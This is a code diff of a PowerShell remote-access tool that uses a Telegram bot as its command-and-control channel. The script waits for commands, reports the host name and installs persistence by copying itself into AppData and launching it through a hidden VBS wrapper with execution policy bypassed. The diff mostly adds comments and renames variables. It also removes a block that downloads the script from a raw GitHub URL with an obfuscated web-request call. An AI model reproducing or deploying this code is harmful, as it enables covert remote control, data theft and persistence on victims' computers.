@@ -1,12 +1,15 @@
-$PassPhrase = "$env:COMPUTERNAME"
-$global:errormsg = 0
 $Token = "$tg" 
+# Define Connection Variables
+$PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
+$global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $URL='https://api.telegram.org/bot{0}' -f $Token
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
+
+# Emoji characters
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
 $closed = [char]::ConvertFromUtf32(0x274C)
@@ -15,18 +18,25 @@ $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
 
+# remove pause files
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
+# Startup Delay
 Sleep 10
+# Get Chat ID from the bot
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
-$mts = New-Object psobject 
-$mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+$MessageToSend = New-Object psobject 
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+# Collect script contents
+$scriptContent = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+#----------------------------------------------- ON START ------------------------------------------------------
+# Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+#----------------------------------------------- ACTION FUNCTIONS ----------------------------------------------
 
 Function Options{
 $contents = "==============================================
@@ -395,13 +405,6 @@ Function AddPersistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-    sleep 1
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
@@ -424,12 +427,7 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
+
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
@@ -518,8 +516,8 @@ return $FixedResult
 Function stgmsg{
 param($Messagetext,$ChatID)
 $FixedText=StrmFX -Stream $Messagetext
-$mts | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
-$JsonData=($mts | ConvertTo-Json)
+$MessageToSend | Add-Member -MemberType NoteProperty -Name 'text' -Value $FixedText.line -Force
+$JsonData=($MessageToSend | ConvertTo-Json)
 irm -Method Post -Uri ($URL +'/sendMessage') -Body $JsonData -ContentType "application/json"
 $catcher = $FixedText
 }
